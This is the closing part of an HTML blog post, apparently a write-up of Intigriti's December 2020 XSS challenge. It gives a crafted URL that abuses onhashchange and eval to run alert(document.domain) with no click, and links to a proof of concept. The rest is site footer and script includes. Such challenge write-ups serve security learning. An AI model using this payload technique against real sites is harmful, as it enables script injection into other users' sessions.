<li><a href="https://challenge-1220.intigriti.io/?num1=onhashchange&amp;operator=%3d&amp;num2=init&amp;#d&amp;num1=calc&amp;num2=eval&amp;num1=alert%28%27achievement%20unlocked:%20unlimited%20swag%20vouchers%20%27%2bdocument.domain%29" target="_blank" rel="noopener noreffer">https://challenge-1220.intigriti.io/?num1=onhashchange&amp;operator=%3d&amp;num2=init&amp;#d&amp;num1=calc&amp;num2=eval&amp;num1=alert(&lsquo;achievement%20unlocked:%20unlimited%20swag%20vouchers%20&rsquo;%2bdocument.domain)</a> - triggering <code>onhashchange</code> and passing <code>alert('achievement unlocked: unlimited swag vouchers '+document.domain)</code> to <code>eval</code></li>
</ul>
<p>Now you can claim your unlimited swag voucher with 0 click:
<figure><a class="lightgallery" href="/2020/12/intigriti-december-xss-challenge/alert.png" title="Pop an alert" data-thumbnail="/2020/12/intigriti-december-xss-challenge/alert.png" data-sub-html="<h2>Pop an alert</h2><p>Pop an alert</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="alert.png"
            data-srcset="/2020/12/intigriti-december-xss-challenge/alert.png, alert.png 1.5x, /2020/12/intigriti-december-xss-challenge/alert.png 2x"
            data-sizes="auto"
            alt="/2020/12/intigriti-december-xss-challenge/alert.png" />
    </a><figcaption class="image-caption">Pop an alert</figcaption>
    </figure></p>
<p>POC: <a href="https://jsfiddle.net/vsz08bpo/" target="_blank" rel="noopener noreffer">https://jsfiddle.net/vsz08bpo/</a></p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 14-12-2020</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/2020/12/intigriti-december-xss-challenge/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.xss.am/2020/12/intigriti-december-xss-challenge/" data-title="Intigriti&#39;s December XSS Challenge Writeup" data-hashtags="challenge,xss,intigriti,eval,unintended"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.xss.am/2020/12/intigriti-december-xss-challenge/" data-hashtag="challenge"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://blog.xss.am/2020/12/intigriti-december-xss-challenge/" data-title="Intigriti&#39;s December XSS Challenge Writeup"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.xss.am/2020/12/intigriti-december-xss-challenge/"><i class="fab fa-reddit fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/challenge/">challenge</a>,&nbsp;<a href="/tags/xss/">xss</a>,&nbsp;<a href="/tags/intigriti/">intigriti</a>,&nbsp;<a href="/tags/eval/">eval</a>,&nbsp;<a href="/tags/unintended/">unintended</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav">
            <a href="/2021/02/intigriti-february-xss-challenge/" class="next" rel="next" title="Intigriti&#39;s February XSS Challenge Writeup">Intigriti&#39;s February XSS Challenge Writeup<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/davwwwx" target="_blank">davwwwx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/twemoji@13.0.0/dist/twemoji.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":70},"comment":{},"data":{"id-1":"/blog.xss.am/","id-2":"/blog.xss.am/"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.f0e4096f68a24e87589ba7942f64874a24befc1ce05399522b0178ac9d3fb20b351b96e095dd6b5bfbe89cb6834a4b3a.js" integrity="sha384-8OQJb2iiTodYm6eUL2SHSiS&#43;/BzgU5lSKwF4rJ0/sgs1G5bgld1rW/vonLaDSks6"></script></body>
</html>
